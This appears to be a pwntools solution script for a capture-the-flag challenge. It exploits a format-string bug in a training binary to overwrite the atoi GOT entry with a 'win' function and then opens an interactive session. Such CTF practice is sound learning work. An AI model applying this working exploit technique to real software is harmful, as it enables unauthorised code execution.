#!/usr/bin/env python3
from pwn import *

elf = ELF("./given/bingbong_adder")
context.arch = "amd64"

def conn():
    if args.REMOTE:
        p = remote("chal.ctf-league.osusec.org", 1319)
    else:
        p = process([elf.path])
        if args.D:
            gdb.attach(p, "b *main + 100")
    return p

def exploit():
    p = conn()
    p.recvuntil(b"Just enter your first number here")
    got_exit = 0x601058
    got_atoi = 0x601038
    func_win = 0x400838
    writes = {got_atoi: func_win}
    # "AAAAAAAA %8$P" shows 0x4141414141414141, so the offset is 8
    payload = fmtstr_payload(8, writes) #numbwritten=8)

    p.sendline(payload)

    p.interactive()

if __name__ == '__main__':
    exploit()
